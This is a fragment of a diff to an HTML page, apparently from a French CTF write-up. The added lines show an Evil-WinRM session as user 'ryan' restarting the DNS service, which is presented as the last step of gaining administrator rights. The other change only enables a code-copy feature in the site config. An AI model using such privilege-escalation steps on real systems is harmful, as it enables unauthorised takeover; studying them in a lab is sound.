+</span><span id="__span-13-36"><a id="__codelineno-13-36" name="__codelineno-13-36" href="#__codelineno-13-36"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">ryan</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">c</span> <span class="s1">&#39;sc start dns&#39;</span>
+</span><span id="__span-13-37"><a id="__codelineno-13-37" name="__codelineno-13-37" href="#__codelineno-13-37"></a>
+</span><span id="__span-13-38"><a id="__codelineno-13-38" name="__codelineno-13-38" href="#__codelineno-13-38"></a><span class="n">SERVICE_NAME</span><span class="p">:</span> <span class="n">dns</span>
+</span><span id="__span-13-39"><a id="__codelineno-13-39" name="__codelineno-13-39" href="#__codelineno-13-39"></a>        <span class="nb">TYPE </span>              <span class="p">:</span> <span class="n">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
+</span><span id="__span-13-40"><a id="__codelineno-13-40" name="__codelineno-13-40" href="#__codelineno-13-40"></a>        <span class="n">STATE</span>              <span class="p">:</span> <span class="n">2</span>  <span class="n">START_PENDING</span>
+</span><span id="__span-13-41"><a id="__codelineno-13-41" name="__codelineno-13-41" href="#__codelineno-13-41"></a>                                <span class="p">(</span><span class="n">NOT_STOPPABLE</span><span class="p">,</span> <span class="n">NOT_PAUSABLE</span><span class="p">,</span> <span class="n">IGNORES_SHUTDOWN</span><span class="p">)</span>
+</span><span id="__span-13-42"><a id="__codelineno-13-42" name="__codelineno-13-42" href="#__codelineno-13-42"></a>        <span class="n">WIN32_EXIT_CODE</span>    <span class="p">:</span> <span class="n">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
+</span><span id="__span-13-43"><a id="__codelineno-13-43" name="__codelineno-13-43" href="#__codelineno-13-43"></a>        <span class="n">SERVICE_EXIT_CODE</span>  <span class="p">:</span> <span class="n">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
+</span><span id="__span-13-44"><a id="__codelineno-13-44" name="__codelineno-13-44" href="#__codelineno-13-44"></a>        <span class="n">CHECKPOINT</span>         <span class="p">:</span> <span class="n">0x0</span>
+</span><span id="__span-13-45"><a id="__codelineno-13-45" name="__codelineno-13-45" href="#__codelineno-13-45"></a>        <span class="n">WAIT_HINT</span>          <span class="p">:</span> <span class="n">0x7d0</span>
+</span><span id="__span-13-46"><a id="__codelineno-13-46" name="__codelineno-13-46" href="#__codelineno-13-46"></a>        <span class="n">PID</span>                <span class="p">:</span> <span class="n">1496</span>
+</span><span id="__span-13-47"><a id="__codelineno-13-47" name="__codelineno-13-47" href="#__codelineno-13-47"></a>        <span class="n">FLAGS</span>              <span class="p">:</span>
+</span><span id="__span-13-48"><a id="__codelineno-13-48" name="__codelineno-13-48" href="#__codelineno-13-48"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">ryan</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span>
+</span></code></pre></div>
 <p>Et on est root :) !</p>
 
 
@@ -8077,7 +8077,7 @@ SERVICE_NAME: dns
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
